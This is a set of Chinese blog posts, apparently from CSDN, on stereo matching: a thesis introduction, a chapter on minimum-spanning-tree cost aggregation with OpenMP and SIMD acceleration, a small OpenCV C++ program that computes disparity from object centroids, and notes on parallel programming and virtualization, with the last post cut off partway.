[25]Scharstein D, Szeliski R. A taxonomy and evaluation of dense two-frame stereo correspondence algorithms[C]// Stereo and Multi-Baseline Vision, 2001. (SMBV 2001). Proceedings. IEEE Workshop on. IEEE, 2001:131-140. 
[28]Deng Y, Yang Q, Lin X, et al. A symmetric patch-based correspondence model for occlusion handling[C]// Proceedings / IEEE International Conference on Computer Vision. IEEE International Conference on Computer Vision. 2005:1316-1322 Vol. 2. 
[29]Freeman W T. Comparison of graph cuts with belief propagation for stereo, using identical MRF parameters[C]// Computer Vision, 2003. Proceedings. Ninth IEEE International Conference on. IEEE, 2003:900. 
[30]Kolmogorov V. Graph based algorithms for scene reconstruction from two or more views[D]. Cornell University, 2004. 
[31]Kolmogorov V, Zabih R. Multi-camera scene reconstruction via graph cuts[M]//Computer Vision—ECCV 2002. Springer Berlin Heidelberg, 2002: 82-96.
论文资源合集

立体匹配综合论文集 :   http://download.csdn.net/detail/wangyaninglm/9591251
基于图像分割的立体匹配论文合集 :  http://download.csdn.net/detail/wangyaninglm/9591253
并行立体匹配论文合集 :  http://download.csdn.net/detail/wangyaninglm/9591255
基于置信传播的立体匹配论文合集 :  http://download.csdn.net/detail/wangyaninglm/9591256
基于稠密匹配的论文合集：   http://download.csdn.net/detail/wangyaninglm/9591259
 









 绪论
计算机视觉是一门通过研究使用计算机来模拟人的视觉系统的学科。“一图胜千言”，人类对于图像中的信息感知效率远超文字等其他媒介，人类获取的信息总量中更是有高达80%依靠视觉系统[1]。相对于人类高效的图像信息提取能力，计算机在图像信息的理解上仍然效率低下。
计算机视觉作为一门交叉学科，综合了生物学，心理学，数学，计算机科学等学科，从20世纪60年代至今其在科学研究领域中的大量成果已经应用于工程领域，并影响了我们每个人生活的方方面面。
双目立体视觉是计算机视觉领域的重要分支，它通过模拟人的双眼视觉系统来处理现实世界。以机器人，无人汽车导航为例，由于双目立体匹配在非接触测量中的优秀性能，视觉测量在探月工程，火星探测工程中起到了重要作用[2]，如图所示的我国嫦娥探月工程的巡航车就配备了立体视觉导航系统如图1-1，来进行行进间的运动控制和路径规划[3]。


图1-1 嫦娥三号巡航车立体视觉系统[4]
Figure 1-1 Stereo Cameras equipped on the lunar rover

1.1 研究背景与意义
立体匹配是一种从平面图像中恢复深度信息的技术。由于双目立体匹配系统通过模拟人眼视觉感知原理，仅需要两台数字摄像机安装在同一水平线上，经过立体矫正就可以投入使用。具有实现简单，成本低廉，并且可以在非接触条件下测量距离等优点。在机器人制导系统中可以用于导航判断、目标拾取，在工业自动化控制系统中可用于零部件安装、质量检测，环境检测，在安防监控系统中可用于人流检测，危害报警。
近年来，随着社会的科技进步，立体匹配技术的发展日新月异，随着匹配算法精度与速度的提高，其应用场景进一步扩大。在此背景下，研究立体匹配变的意义非凡。
立体匹配作为三维重建、立体导航、非接触测距等技术的关键步骤通过匹配两幅或者多幅图像来获取深度信息。并且广泛应用于，工业生产自动化、流水线控制、无人驾驶汽车（测距，导航）、安防监控、遥感图像分析、机器人智能控制等方面。虽然立体匹配应用广泛但是还有很多尚未解决的难题因此该技术成为了近年来计算机视觉领域广泛关注的难点和热点。
立体匹配作为一种工程化问题，在实施过程中有多种因素影响其精度与速度，并没有一种复杂算法可以完整的处理立体匹配的整个流程，本文所述算法主要针对立体匹配中图像像素匹配并计算视差这一核心步骤。
通常根据立体匹配算法所采用的约束，可以将其分为两大类算法[5]：第一类为基于区域约束的局部匹配算法。如采用匹配窗的代价聚合算法（平方差算法SSD，绝对差算法SAD，归一化算法NCC等）；采用特征点的匹配算法；采用相位匹配的的匹配算法。这些算法的优点是算法整体的计算量小，能够快速恢复出纹理丰富区域的视差。缺点是在低纹理区域会造成误匹配[5]，得到的视差图不致密，需要在后期通过插值算法来进行修正。第二类为基于全局约束的优化算法，如图割算法(Graph 
Cuts, GC)，人工智能算法（如遗传算法，多层神经网络），置信传播算法(Belief 
Propagation, BP)，动态规划算法(Dynamic Programming, 
DP)。这些算法虽然运算时间较长并且会产生一些误匹配，但是基本上能够获得所有的视差信息从而生成稠密的视差图。
1.2 国内外研究现状
国外在计算机立体视觉上的研究开展较早，Roy[7]最早将图割算法应用于立体匹配，并通过实验表明，图割算法能有效克服其他全局优化算法的缺点（如动态规划算法等生成视差图产生的横向条纹瑕疵），避免了视差在临近极线处不连续的问题。但该算法生成的视差图轮廓边缘模糊，视差层的区分度低。Geiger等[8]，针对高分辨率图像立体匹配运算时间长的问题，创造性的提出了使用强约束点（纹理或特征信息较为丰富）作为支撑点，在强约束点之间通过三角剖分对视差图进行插值计算，结合OpenMP技术在通用CPU上实现了并行计算，操作简单易于搭建环境，在通用微型计算机上实现了实时立体匹配，但是匹配效果和基于全局优化的匹配算法有一定差距。
国内对于立体视觉的研究起步较晚，早期主要采用基于特征点匹配的方法，随着技术的进步，后序对立体匹配的改进工作主要集中在对全局优化算法性能和准确度的提升上。其中大部分方法采用对待匹配图像进行图像分割后，再结合能量最优化的方法进行立体匹配。如尹等[9]首先采用均值平移算法将参考图像根据颜色信息快速聚类；之后计算初始视差图；最后采用图割算法并将分割结果作为独立的一项计算能量函数最小值。此种基于图像分割的立体匹配方法的理论基础认为，分割区域块内的视差变化是平滑的。因此与其他基于图像分割的立体匹配算法相比，此类算法[9]可有效地处理大块低纹理区域，匹配精度高，更有利于估计视差图的边界。并且上述算法通过分割减少了匹配基元，使得运算速度更快，能够很好的解决的边界模糊和低纹理区域的误匹配问题。
立体匹配技术在工程领域的应用十分广泛，比如在我国嫦娥探月工程中，王等[4]改进了勇气号机遇号火星车复杂的定位技术，对嫦娥3号月面巡航器的视觉导航系统，采用SIFT(scale-invariant 
feature transform) 
匹配、相关系数匹配、最小二乘匹配和光束法平差等多项技术融合，实现了相邻站间月面巡视器的导航定位。实验表明该系统视觉定位相对精度优于4%。
朱[10]使用双目立体视觉的方法进行工件的自动定位、识别与抓取，首先根据采集到图像的SIFT特征，从SIFT特征集合模板中匹配工件进行识别。其次，去除噪声后对图像进行二值化并获取质心坐标进行定位。最后，结合双目立体视觉标定技术，使用最小二乘法求得工件质心的世界坐标，为机器人抓取工件提供信息。
顾等[11]为实现统计实时人流，提出一种基于立体视觉的人头检测算法。该方法对双目相机采集的图像通过运动目标检测分离出运动人员所在区域，利用视差的连续性只对强纹理点进行绝对误差累积(SAD)匹配，其余点只进行视差验证，因此能够得到稠密的视差图，再由三角投影关系计算出深度图。由于双目立体成像得到的深度图中人员与场景的深度分布不同，采用深度分层的方法将存在人头信息的深度层提取出来，并通过几何形态来确定人的头部，该算法可以很好地适应复杂场景下的人头检测，并且由于采用了基于局部优化的匹配算法结合插值计算等手段所以其在精度、速度上都有很好的实时特性。
Yang等[12]提出了基于最小生成树的代价聚合方案，采用像素间的相似性作为边的权值，通过无向连通图构建最小生成树，使得局部像素点获取了全局的信息。该算法对于低纹理，无纹理，光照变化等区域的匹配效果达到甚至超越了全局优化算法的水平。针对采集的待匹配图像可能带有噪声或者复杂纹理的问题，Yang等在上述算法的基础上进行了系统化的流程设计与改进[13]，利用左右交叉检验精确更新代价聚合中稳定和不稳定的点的代价，提升了算法精度。
近年来立体匹配技术的实时性需求日益高涨，随着硬件的发展，立体匹配围绕如何快速获取稠密视差图以及将匹配算法并行化进行了卓有成效的研究，通过将图像分割替换为运算效率更高的保边滤波器，Yang等[14]，利用双边滤波器性质并加以改进，融合并行计算技术，达到了平均每秒60帧左右的匹配结果。Qingqing 
Yang等[15]针对另一种保边滤波器——导向滤波，提出了新的代价聚合方案，采用自适应窗口融合滤波进行代价聚合，在局部匹配算法中取得了不错的精度，并且该算法经过并行化处理后可以在GPU上进行运算，相对于CPU取得了平均30倍的加速[16]。
1.3本文研究内容
本文针对双目立体视觉中基于图论的立体匹配算法进行研究。主要研究以下几个方面的内容：
1.通过研究立体匹配算法的发展历史和分类准则，在对前人文献阅读的基础上根据文献的实验结果评价算法质量，从中选取一到两个有意义且实用性强的研究切入点。
2.研究图割算法及其应用，主要包括：基本思想，算法流程，能量函数的构造，以及能量最小化等相关内容。
3.根据对立体匹配应用场景的分析，本文提出一种基于交互式图像分割的立体匹配方法。针对大多数场景中只需计算特定目标视差的需求，通过有效利用网络图先后完成了图像分割和立体匹配的工作，降低了算法的空间复杂度和内存占用，并且减少了运算时间。
4.针对全局优化算法运算时间缓慢，局部优化算法结果不精确的问题。本文利用最小生成树取代局部优化算法的匹配窗，为匹配基元添加了全局特性，并通过OpenMP，SIMD等技术在通用处理器上对算法进行扩展优化，达到了实时计算的标准。
5.介绍了本文算法试验系统的软硬件配置，阐述并详细分析了实验结果，对双目立体视觉未来的研究方向，研究热点进行了预测与展望。
1.4论文结构
本文针对上述研究内容，共包含五章：
第一章：绪论，介绍了研究立体匹配的背景与意义，根据国内外文献的实验结果和原理阐述各类立体匹配方法的优缺点，总结本文的基于图论的立体匹配算法研究内容，描述文章框架。
第二章：立体匹配基础，首先介绍了双目视觉的基础理论，立体匹配的基础——视差理论。其次介绍了立体匹配算法设计中需要注意的各类约束，主要包括：极线，相容性，唯一性，连续性等约束。最后介绍了立体匹配的几种主要算法，立体匹配后处理中遮挡问题的处理。
第三章：基于交互式图像分割的立体匹配方法，提出了一种基于图割算法的立体匹配方法，其流程充分利用了网络图资源，有效降低了内存占用提高了算法运行时间。本章主要介绍了图割算法中的网络流问题，能量函数的优化问题。详细介绍了图割算法中立体匹配网络图的构造，基于图割算法的交互式图像分割与立体匹配的融合过程。介绍了本章算法的优秀效果，基于Middlebury学院提供的标准图像库对原始图割算法进行了对比实验，并给出了分析。
第四章：基于最小生成树的实时立体匹配算法，针对带有非局部特性的立体匹配方法，根据局部算法特性，将匹配窗的代价聚合方式替换为拥有全局特性的树形结构的代价聚合，介绍了在树形结构上进行代价聚合的两种方式，提出了一种可移植的通用并行化加速扩展方案，通过此方法将原有串行算法的运算速度提升为实时运算。
第五章：总结与展望，对本文工作进行了总结，展望了立体匹配算法今后的发展方向。
参考文献

马颂德,张正友. 计算机视觉—计算理论与算法基础[M].北京:科学出版社,1997.
邸凯昌. 勇气号和机遇号火星车定位方法评述[J]. 航天器工程, 2009, 18(5):1-5.
吴伟仁, 王大轶, 邢琰,等. 月球车巡视探测的双目视觉里程算法与实验研究[J]. 
中国科学:信息科学, 2011(12):1415-1422.
王保丰, 周建亮, 唐歌实,等. 嫦娥三号巡视器视觉定位方法[J]. 
中国科学：信息科学, 2014, 04期(04):452-460.
白明, 庄严, 王伟. 双目立体匹配算法的研究与进展[J]. 控制与决策, 2008, 
23(7):721-729.
张令涛, 曲道奎, 徐方. 一种基于图割的改进立体匹配算法[J]. 机器人, 2010, 
32(1):104-108.
Roy S, Cox I J. A maximum-flow formulation of the n-camera stereo 
correspondence problem[A]// IEEE International Conference on Computer 
Vision[A], 1998 January 4-7, Bombay India:492-499.
Geiger A, Roser M, Urtasun R. Efficient large-scale stereo 
matching[M]//Computer Vision–ACCV 2010. Springer Berlin Heidelberg, 2011: 
25-38.
尹传历, 刘冬梅, 宋建中. 改进的基于图像分割的立体匹配算法[J]. 
计算机辅助设计与图形学学报, 2008, 20(6):808-812.
朱代先. 基于双目视觉的工件定位与抓取研究[J]. 计算机测量与控制, 2015, 
19(1):92-94.
顾骋, 钱惟贤, 陈钱,等. 基于双目立体视觉的快速人头检测方法[J]. 中国激光, 
2014(1):150-155.
Yang Q. A non-local cost aggregation method for stereo matching[C]// 
Proceedings / CVPR, IEEE Computer Society Conference on Computer Vision and 
Pattern Recognition. IEEE Computer Society Conference on Computer Vision and 
Pattern Recognition. 2012:1402-1409.
Yang Q. Stereo Matching Using Tree Filtering[J]. Pattern Analysis & Machine 
Intelligence IEEE Transactions on, 2015, 37(4):834-846.
Yang Q. Hardware-efficient bilateral filtering for stereo matching[J]. 
Pattern Analysis and Machine Intelligence, IEEE Transactions on, 2014, 
36(5): 1026-1032.
Yang Q, Li D, Wang L, et al. Full-Image Guided Filtering for Fast Stereo 
Matching[J]. IEEE Signal Processing Letters, 2013, 20(3):237-240.
Yang Q, Ji P, Li D, et al. Fast stereo matching using adaptive guided 
filtering[J]. Image and Vision Computing, 2014, 32(3): 202-211.
 









转载请注明出处：http://blog.csdn.net/wangyaninglm/article/details/51533549， 
来自： 
shiter编写程序的艺术
图割，置信传播等全局优化立体匹配算法，由于运算过程中需要迭代求精，运算时间长，无法达到实时计算立体匹配的需求，然而实时性需求却广泛存在立体匹配的应用场景中。很多基于局部匹配的算法虽然运算时间短，但由于仅考虑匹配窗内的代价聚合，效果很差，视差图只有很多稀疏的视差点，还要经过插值计算，显然无法用于汽车导航，目标拾取等需要精确结果且对运算速度有一定要求的场景。
1局部代价聚合
基于窗结构局部立体匹配算法，按照匹配约束来搜索最佳的匹配点，在搜索求取左右两幅图像在视差d下一点的匹配代价时，实际是求得以该点为中心的匹配窗内所有点的代价的平均值（或者其他的度量方式）。如图（4-1）： 
 
图 4-1 局部匹配算法的代价传递 
Figure 4-1 Cost delivery of local aggregation 
我们把这一过程叫做代价聚类（Cost aggregation），这种基于区域的匹配方法利用局部窗口之间的相似性度量来匹配对应基元的空间坐标，对于连续性细节明显的区域效果较好。显然，此类方法对于匹配窗以外的点却无法影响该点的代价值，使得代价聚类的值不具有全局特性，也就丧失了匹配基元的全局结构特性，因此在纹理特征较低的区域非常容易产生误匹配。 
    如何在代价聚类中获取匹配基元的全局特征，进而使得局部代价聚合方法克服上述缺点，本章相对于基于区域的局部窗立体匹配方法，采用图论中的最小生成树方法，利用树结构进行全局代价聚合。
2 双边滤波与代价聚合
双边滤波（Bilateral filter）是一种可以保边去噪的滤波器。简单的说就是一种同时考虑了像素空间差异与强度差异的滤波器，因此具有保持图像边缘的特性。该滤波器可以由两个滤波参数进行控制。一个控制几何空间距离。另一个控制像素差。 
 
图 4-2 双边滤波对空间和颜色权重的同时作用 
Figure 4-2 bilateral filter weights of the central pixel 
    在传统高斯滤波器中，权重只和像素之间的空间距离有关系，无论图像的内容是什么，都有相同的滤波效果。双边滤波器，在高斯滤波器的基础上增加了像素差值的权重信息，公式（4-1）如下所示： 

公式（4-1）是一个归一加权平均，和分别衡量图像I的滤除量，前者控制距离信息的权重，后者控制颜色信息的权重。因此总体而言，在像素强度变换不大的区域，双边滤波有类似于高斯滤波的效果，而在图像边缘等强度梯度较大的地方，可以保持梯度。该特性在立体匹配问题中可以取代图像分割方法，或者作为图像分割方法的预处理手段，降低核心匹配算法的计算量。 
    设为像素p在视差层级d的匹配代价，为聚集代价。则双边滤波可以按照公式（4-1）与求取聚集代价进行融合中。 
 
其中q作为支撑窗中的一个像素。和与公式（4-1）的参数类似分别为调整空间相似性，和颜色（灰度）相似性的两个参数。通常双边滤波函数计算中可以省去标准化的步骤，则公式（4-3）可以简化为： 

3 最小生成树
最小生成树也叫最小权重生成树。在给定的无向图中，(u,v)代表连接顶点u与顶点v的边，w(u,v)代表此边的权重，若存在T为E的子集且不存在环，使得w(T)最小，则T为G的最小生成树。 
 
根据最小生成树结构，当把图像看做是一个四联通区域的图时，图像两点所形成边的权值定义为这两点灰度值的差值（或者颜色信息等其他度量准则），这种定义下生成的最小生成树结构正好符合为匹配窗添加全局特性的期望。
4 基于最小生成树的代价聚合
求两幅待匹配图像在视差d下一点的代价值时，基于区域的匹配窗代价聚合方法对与匹配窗以外的点无法影响该点的代价值，着眼于代价聚类，为了使代价值具有全局属性，使图像内所有点都对该点传递一个支撑量，距离该点较远的颜色差别很大的像素点传递较小的支撑量，距离相近颜色差别不大的传递较大的支撑量。 
根据最小生成树结构我们知道，当把图像看做是一个四联通区域的图时，图像两点所形成边的权值我们可以定义为这两点灰度值的差值，这种定义下生成的MST结构正好符合我们的期望，相当于在局部算法上加了全局性质，并且没有增加过多的运算量。 
基于最小生成树的代价聚类过程十分简单，针对待匹配图像生成一颗最小生成树后，其代价聚合方式主要有两种： 
1.自底向上聚合，即从叶子节点到顶点的遍历。 
2.自顶向下聚合，即从顶点到叶子节点的遍历。 
    对于每一个节点的聚合代价，只需要对生成树遍历两次就可以得到结果（如图4- ）。 
 
图 4-3 两种代价聚合方案 
Firgure 4-3 Two cost aggregation schemes 
    设S（p，q）定义为两点的相似度，D（p，q）定义为两点的距离（MST两点间的最小路径），为聚类值。则有： 
 
    其中作为控制两点之间相似度的参数。融合公式（4-4）双边滤波的结果后： 
 
    注意到公式（4-4）中存在两个滤波控制参数，由于最小生成树结构本身带有距离度量，并且在树中距离相近的像素也越相似，所以公式（4-7）只使用一个参数控制相似度。 
    下面根据两种聚合方式分别介绍如何计算聚合代价。
4.1 自底向上聚合（Leaf to Root）
 
图4-4 自底向上聚合 
Figure 4-4 Leaf to Root aggregation 
    自底向上聚合即为Leaf to Root，是从叶子节点到根节点的代价聚合，以图4-4为例，假设图4-4是一个最小生成树，边上的数值代表权重，此时计算节点V4的代价聚合，那么可以直接计算子节点（V3， V4）的代价聚合值与各自边缘的乘积集合，因为V4是根节点，不需要考虑父节点的影响。箭头向上代表从叶子到当前节点的代价聚合值。则V4的聚合代价可以表示为公式（4-8）： 
 
根据公式（4-8）可以推导出计算自底向上聚合代价的方法，按照根节点的聚合代价为子节点聚合代价乘积的和来进行计算： 
 
    如果节点v是叶子节点，则 
由于在计算过程中利用了最小生成树的特性，自底向上的代价聚合过程中每一层的计算只需要计算其子节点的乘积，而子节点的代价聚合值已经包含了孙子节点及其子孙节点的影响。所以运算过程中极大的降低了运算量。
4.2 自顶向下聚合（Root to leaf）
对于图4-4中的情况，V4没有父亲节点，属于特殊情况，如果我们要计算V3的代价聚合值呢？显然只考虑V1和V2是不够的，还得考虑V4的影响。也就是从上到下的影响。如图4-5所示： 
 
图 4-5 自顶向下聚合 
Figure 4-5 Root to leaf aggregation 
此时我们完全可以假设V3为根节点，它的父节点向下转换变为他的子节点，则可以利用同样的办法，将V4的代价聚合值乘以它的权重一起再加进来。但是因为V4的代价聚合值已经考虑到了V3的影响，所以必须事先将V4的代价聚合值减去V3的代价聚合值才可以。则V3的聚合代价值可以表示为： 
 
其中，自顶向下的代价聚合值就是最终的代价聚合值，要从上到下一层一层的计算代价，这样同样可以减少计算量。对于更为一般的情况，即当从根节点向叶子节点代价聚集时候，根据公式（4-10）可以推导出其一般形式： 
 
化简得： 

5 立体匹配的通用并行化处理
并行程序开发的编程模型主要分为两类：1.消息传递模型，2.共享存储模型。本文主要采用共享存储模型在彩色图像的各个通道上采取粗粒度的并行划分，在彩色图像上进行并行化处理，各个通道内部针对滤波算法，最小生成树的建立等算法，进行基于处理器指令向量化的SIMD扩展。 
    其主要流程如下流程图所示： 
 
图4- 并行化立体匹配流程 
Figure 4-  
    首先针对基于最小生成树的全局立体匹配算法，的整个算法流程进行计算量分析建模，分析并提取其中的密集计算任务，参照[32]进行双边滤波的优化
5.1 OpenMP 线程并行化
OpenMP实际上是对共享内存并行系统，提供了一套指导性的编译注释方案。现在的常用的品牌基于x86架构的Intel AMD桌面处理器，基于ARM架构的处理器对OpenMP都有很好的支持。作为主流的共享内存模型，得到了几乎所有商业编译器的支持，具有很好的可移植性。 
主要是，加上openmp代码编译选项后，代码可移植了。
5.2 通用处理器指令优化（SIMD向量化计算）
几乎所有的处理器厂商都为自己的处理器产品制作了多媒体扩展部件。图形处理器的并行计算需要额外的硬件投入，而且与内存交换数据需要耗费时间。多媒体扩展部件一般在处理器中以向量部件的形式出现，相应的指令集以（Single Instruction Multi Data）单指令多数据流作为出现. 
SIMD在性能上的优势：编辑以加法指令为例，单指令单数据（SISD）的CPU对加法指令译码后，执行部件先访问内存，取得第一个操作数；之后再一次访问内存，取得第二个操作数；随后才能进行求和运算。而在SIMD型的CPU中，指令译码后几个执行部件同时访问内存，一次性获得所有操作数进行运算。这个特点使SIMD特别适合于多媒体应用等数据密集型运算。 
SIMD适量指令能够加速如C和Java语言的处理。矢量指令对过个数据元素进行并行操作，从而使主机能够快速处理大量数据。这对于社交媒体和大数据工作负载来说是个福音，但对面临普通负载的系统程序员来说似乎没有太大的帮助。 
SIMD指令通过多种方式增加吞吐量。大多数机器指令会的结果会覆盖输入操作数其中之一不同，大部分SIMD指令集会使用两个输入寄存器，并将结果存储在第三个寄存器。这意味着程序员可以节省与寄存器纠结的时间。 
矢量寄存器为128字节长度。前16个寄存器实际上与64位浮点寄存器(FPRs)共存。改变一个FPR同样会破坏对应矢量寄存器的所有字节。存在一些关于通过程序调用保护矢量寄存器的特殊规则，IBM的Assembler Services Guide有详细说明。 
SIMD向量指令包括所有数学函数和浮点模式。同样也有字符串操作以及用于获取和存储数据的方法。
参考文献
[11]Yang Q. A non-local cost aggregation method for stereo matching[C]// Proceedings / CVPR, IEEE Computer Society Conference on Computer Vision and Pattern Recognition. IEEE Computer Society Conference on Computer Vision and Pattern Recognition. 2012:1402-1409. 
[12]Yang Q, Ji P, Li D, et al. Fast stereo matching using adaptive guided filtering[J]. Image and Vision Computing, 2014, 32(3): 202-211. 
[13]Yang Q. Hardware-efficient bilateral filtering for stereo matching[J]. Pattern Analysis and Machine Intelligence, IEEE Transactions on, 2014, 36(5): 1026-1032. 
[14]Yang Q. Stereo Matching Using Tree Filtering[J]. Pattern Analysis & Machine Intelligence IEEE Transactions on, 2015, 37(4):834-846.
论文资源合集

立体匹配综合论文集 :   http://download.csdn.net/detail/wangyaninglm/9591251
基于图像分割的立体匹配论文合集 :  http://download.csdn.net/detail/wangyaninglm/9591253
并行立体匹配论文合集 :  http://download.csdn.net/detail/wangyaninglm/9591255
基于置信传播的立体匹配论文合集 :  http://download.csdn.net/detail/wangyaninglm/9591256
基于稠密匹配的论文合集：   http://download.csdn.net/detail/wangyaninglm/9591259

转载请注明出处：http://blog.csdn.net/wangyaninglm/article/details/51533549， 
来自： 
shiter编写程序的艺术 








    视差的计算，主要要计算待匹配图像对应像素的水平偏移，那么针对一个物体而言，其在场景中的视差大体上应该是平滑的，所以可以直接针对分割出的物体计算重心的水平偏移从而得到视差值，我做了一个小实验，感觉效果还行，下面是代码和实验结果，希望各位有什么想法大家交流。

    有一个问题就是，我这个视差计算出来是这个台灯是221的灰度，标准的是224的灰度。
我的流程是算出横向偏移x，视差 = x * （视差最大层级/255）,这个tusukuba图像的视差层级是15，所以算出来是221

效果：



groundtruth：

代码：用opencv1写的，有兴趣的哥们把他改成opencv新版的吧

// FindGravity.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>
#include <string>
#include "cv.h" 
#include "highgui.h" 




#include <opencv2/core/core.hpp>  
#include <opencv2/highgui/highgui.hpp>


#pragma comment(lib,"opencv_core2410d.lib")                
#pragma comment(lib,"opencv_highgui2410d.lib")                
#pragma comment(lib,"opencv_imgproc2410d.lib")   

using namespace std;
using namespace cv;


void FindGravity()
{
	
}
/** 计算二值图像的重心
* @param[in] src  输入的待处理图像
* @param[out] center 重心坐标
* @retval 0  操作成功
* @retval -1 操作失败
* @note 输入图像是二值化图像
* @note xc=M10/M00, yc=M01/M00, 其中 Mx_order,y_order=SUMx,y(I(x,y)*x^x_order*y^y_order)
 */
 static int aoiGravityCenter(IplImage *src, CvPoint ¢er)
 {
  //if(!src)
  // return GRAVITYCENTER__SRC_IS_NULL;
  double m00, m10, m01;
  CvMoments moment;
  cvMoments( src, &moment, 1);
  m00 = cvGetSpatialMoment( &moment, 0, 0 );
  if( m00 == 0) 
   return 1;
  m10 = cvGetSpatialMoment( &moment, 1, 0 );
  m01 = cvGetSpatialMoment( &moment, 0, 1 );
  center.x = (int) (m10/m00);
  center.y = (int) (m01/m00);
  return 0;
 } 

 IplImage* binary_image(IplImage* src)
 {
	 

		// cvThreshold( src, src, 100, 255, CV_THRESH_BINARY );//100 is the thredhold 
		 IplImage* one_channel = cvCreateImage(cvSize(src->width,src->height),IPL_DEPTH_8U,0);
		
		 for(int y = 0;y < src->height;y++)
		 {
			 char *ptr= src->imageData + y * src->widthStep;
			 char *p_one_channel = one_channel->imageData + y * one_channel->widthStep;
			 for(int x = 0;x < src->width;x++)
			 {
				 int temp = ptr[3*x];
				 if (temp != 0)//不是黑色也就是说不是背景
				 {
					 p_one_channel[x] = 255;//设置为白色
				 }
				 else
				 {
					 p_one_channel[x] = 0;

				 }
				 //ptr[3*x]=
				 //ptr[3*x+1]=
				 //ptr[3*x+2]=; 
			 }
		 }
		 return one_channel;


 }

 void showDisparity(int max,int weiyi,IplImage* src)
 {
	int danwei = 255/max;
	int gray_pixel = weiyi*danwei;
	cout<<gray_pixel<<endl;


	IplImage* one_channel = cvCreateImage(cvSize(src->width,src->height),IPL_DEPTH_8U,0);

	for(int y = 0;y < src->height;y++)
	{
		char *ptr= src->imageData + y * src->widthStep;
		char *p_one_channel = one_channel->imageData + y * one_channel->widthStep;
		for(int x = 0;x < src->width;x++)
		{
			int temp = ptr[x];
			if (temp != 0)//不是黑色也就是说不是背景
			{
				p_one_channel[x] = gray_pixel;//设置为视差
			}
			else
			{
				p_one_channel[x] = 0;

			}
			//ptr[3*x]=
			//ptr[3*x+1]=
			//ptr[3*x+2]=; 
		}
	}
	
	cvNamedWindow( "disparity", 1 ); 
	cvShowImage( "disparity", one_channel );
 }

int _tmain(int argc, _TCHAR* argv[])
{
	string str_name_left = "lamp_left.bmp";
	string str_name_right = "lamp_right.bmp";

	IplImage* src_left;
	IplImage* src_right; 
	IplImage* draw = cvLoadImage(str_name_left.c_str(),1);//绘制重心的图像
	
	if ((src_left = cvLoadImage(str_name_left.c_str(),1))!=0)
	{
		//src = binary_image(src);
		cvNamedWindow( "binary image left", 1 ); 
		cvShowImage( "binary image left", binary_image(src_left) );

		src_right = cvLoadImage(str_name_right.c_str(),1);
		cvNamedWindow( "binary image right", 1 ); 
		cvShowImage( "binary image right", binary_image(src_right) );
	}

	CvPoint xy_left;
	aoiGravityCenter(binary_image(src_left),xy_left);
	cout<<"left image gravity center: "<<endl<<xy_left.x<<endl;
	cout<<xy_left.y<<endl;

	CvPoint xy_right;
	aoiGravityCenter(binary_image(src_right),xy_right);
	cout<<"right image gravity center: "<<endl<<xy_right.x<<endl;
	cout<<xy_right.y<<endl;


	cvCircle(draw,cvPoint(xy_left.x,xy_left.y),3,CV_RGB(0,0,255),5);

	cvNamedWindow( "重心", 1 ); 
	cvShowImage( "重心", draw ); 

	int weiyi = ( xy_left.x - xy_right.x);
	showDisparity(15,weiyi,binary_image(src_left));
	cvWaitKey(0);
	return 0;
}













    本文从基础入手，主要阐述基于桌面电脑的多核程序设计的基础知识，包括一些向量化运算，虚拟机算，多线程等的相关知识总结。


一.计算平台的分类

单指令单数据流机器（SISD）
传统的串行计算机，所有指令都是串行。

多指令单数据流机器（MISD）
多个指令流同时对一个数据流进行处理。但是大多数情况下，多个指令流处理多个数据才是更加有效的处理方式。

单指令多数据流机器（SIMD）

几乎所有的计算机都实现了SIMD功能，intel处理器中实现的MMX,SSE,SSE2,SSE3等扩展指令集
说到这里，我就多少说几句，最近在做这方面的优化，发现居然知网上面很多研究 ，SIMD编译优化的，其实debug和release下面的程序运行时间差别很大，visual studio默认开启了很多编译优化，如果对c语言的内部函数不是很熟悉，编译成release版本的程序已经是优化的不错了，但是针对SIMD指令优化最好的莫过于Intel自己家的编译器

windows下SIMD编译优化的例子：

http://bbs.csdn.net/topics/391894458



多指令多数据流机器（MIMD）

能够同时执行多个指令流，这些指令流分别对不同的数据流进行操作。MIMD是目前最流行的并行计算平台。例如 intel core duo双核处理器。

目前的计算机一般都属于SIMD机器或者MIMD机器，而这两种机器都提供了支持并行执行的硬件特性，因此软件开发人员能够非常方便的利用软件中存在的数据级和任务级并行性来提高程序性能。

如果要在应用程序中使用多线程技术，就必须对操作系统的限制有清楚的了解，也就是对系统的api有充分的了解，然而这对于开发通用高性能计算的程序确是一大障碍，我们不能换一个系统，就掌握一套api。

二. 虚拟环境：虚拟机和虚拟平台

在现在很多平台上运行的多线程环境其实是基于虚拟机的，并且目前计算的一个重要趋势是虚拟化。虚拟化技术主要有两种：

1.运行时虚拟化
典型的如：JAVA virtual machine，jvm，微软的通用语言运行时环境Common language runtime CLR
这些虚拟机都至少创建了三个线程：
执行线程
垃圾回收线程
编译线程（just-in-time 即时编译执行技术，将字节码编译成可执行的二进制代码）

一般来讲，这些虚拟机为任务创建的其他进程会以最优化的方式映射到其他可执行资源上。

2.系统虚拟化




VMM virtual machine monitor 虚拟机监视器对底层的平台进行必要的 虚拟化，从而使得每个虚拟机上的操作系统都感觉自己拥有整个硬件资源。

处理器虚拟化技术所带来的一个非常重要的好处就是能够剥离指令集结构（instruction set architecture，ISA）与处理器之间的必然联系。但是特权指令只能由操作系统进行执行。所以需要执行特权指令的时候需要向虚拟机监视器发送请求，得到响应后才能执行，这之中当然降低了效率。因此Intel开发了一系列ISA扩展来支持VMM有效的执行特权指令，这些指令就是大名鼎鼎的Intel虚拟化技术，用来提高VMM的性能（VMware，hamx等技术都依赖这个扩展进行实现，但是似乎和windows
 的hyper-x有点冲突，实在是不太明白，还请过来人指点一二：
http://blog.csdn.net/wangyaninglm/article/details/50602482）


三.并行程序设计的基本概念

设计并行程序，程序员应该将应用程序看成是众多相互依赖的任务的集合。将应用程序划分成多个独立的任务，并确定这些任务之间的相互依赖关系的过程就称为分解（decomposition），分解问题 的方式主要有三种：
1.任务分解
2.数据分解
3.数据流分解




并行程序需要注意的几个问题：
1.同步（Synchronization）
2.通信
3.负载平衡
4.可扩展行（Scalability）


并行误差扩散算法程序实现如下：
程序主要按照论文和书中的代码实现，但是对于数据要进行一些特殊的处理

讨论帖子：讨论帖

// ERROR-diffusion.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "omp.h"
#include "windows.h"
#include <iostream>

#include <opencv2/core/core.hpp>    
#include <opencv2/highgui/highgui.hpp>  


#pragma comment(lib,"opencv_core2410d.lib")                  
#pragma comment(lib,"opencv_highgui2410d.lib")                  
